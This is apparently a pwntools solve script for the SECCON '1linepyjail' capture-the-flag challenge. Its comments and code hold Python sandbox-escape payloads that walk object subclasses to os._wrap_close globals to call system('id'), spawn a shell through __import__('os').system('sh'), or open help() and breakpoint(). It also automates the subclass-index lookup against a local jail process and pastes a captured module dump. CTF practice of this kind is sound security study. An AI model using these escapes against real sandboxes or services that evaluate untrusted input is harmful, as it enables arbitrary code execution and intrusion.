# ref. https://zenn.dev/tchen/articles/5c446d9dbd9920
from pwn import *

# local: ().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('id')
# ().__dir__.__class__.__subclasses__()
# ().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__["__builtins__"]["help"]()
# ().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__["__builtins__"]["breakpoint"]()
# __import__("os").system("sh")


def execute(cmd):
    # io = remote("1linepyjail.seccon.games", 5000)
    io = process(["python", "jail.py"])
    io.sendline(cmd)
    res = io.recvline()
    io.interactive()
    return res


# print(execute(b"().__class__.__mro__[1].__subclasses__()"))

class_list = execute(b"().__class__.__bases__[0].__subclasses__()").split(b",")
index = class_list.index(b" <class 'os._wrap_close'>")
print(index)

# ().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__["sys"].breakpointhook()
# res = execute(
#     f"().__class__.__bases__[0].__subclasses__()[{index}].__init__.__globals__['sys'].breakpoint()".encode()
# )
res = execute(
    f"().__class__.__bases__[0].__subclasses__()[{index}].__init__.__globals__['__builtins__']['help']()".encode()
)
print(res)


"""
b"jail> dict_values([<module 'sys' (built-in)>, <module 'builtins' (built-in)>, <module '_frozen_importlib' (frozen)>, <module '_imp' (built-in)>, <module '_thread' (built-in)>, <module '_warnings' (built-in)>, <module '_weakref' (built-in)>, <module '_io' (built-in)>, <module 'marshal' (built-in)>, <module 'posix' (built-in)>, <module '_frozen_importlib_external' (frozen)>, <module 'time' (built-in)>, <module 'zipimport' (frozen)>, <module '_codecs' (built-in)>, <module 'codecs' (frozen)>, <module 'encodings.aliases' from '/usr/local/lib/python3.12/encodings/aliases.py'>, <module 'encodings' from '/usr/local/lib/python3.12/encodings/__init__.py'>, <module 'encodings.utf_8' from '/usr/local/lib/python3.12/encodings/utf_8.py'>, <module '_signal' (built-in)>, <module '_abc' (built-in)>, <module 'abc' (frozen)>, <module 'io' (frozen)>, <module '__main__' from '/app/jail.py'>, <module '_stat' (built-in)>, <module 'stat' (frozen)>, <module '_collections_abc' (frozen)>, <module 'genericpath' (frozen)>, <module 'posixpath' (frozen)>, <module 'posixpath' (frozen)>, <module 'os' (frozen)>, <module '_sitebuiltins' (frozen)>, <module 'pwd' (built-in)>, <module 'site' (frozen)>, <module 'types' from '/usr/local/lib/python3.12/types.py'>, <module '_operator' (built-in)>, <module 'operator' from '/usr/local/lib/python3.12/operator.py'>, <module 'itertools' (built-in)>, <module 'keyword' from '/usr/local/lib/python3.12/keyword.py'>, <module 'reprlib' from '/usr/local/lib/python3.12/reprlib.py'>, <module '_collections' (built-in)>, <module 'collections' from '/usr/local/lib/python3.12/collections/__init__.py'>, <module '_functools' (built-in)>, <module 'functools' from '/usr/local/lib/python3.12/functools.py'>, <module 'enum' from '/usr/local/lib/python3.12/enum.py'>, <module '_sre' (built-in)>, <module 're._constants' from '/usr/local/lib/python3.12/re/_constants.py'>, <module 're._parser' from '/usr/local/lib/python3.12/re/_parser.py'>, <module 're._casefix' from '/usr/local/lib/python3.12/re/_casefix.py'>, <module 're._compiler' from '/usr/local/lib/python3.12/re/_compiler.py'>, <module 'copyreg' from '/usr/local/lib/python3.12/copyreg.py'>, <module 're' from '/usr/local/lib/python3.12/re/__init__.py'>])\n"
"""
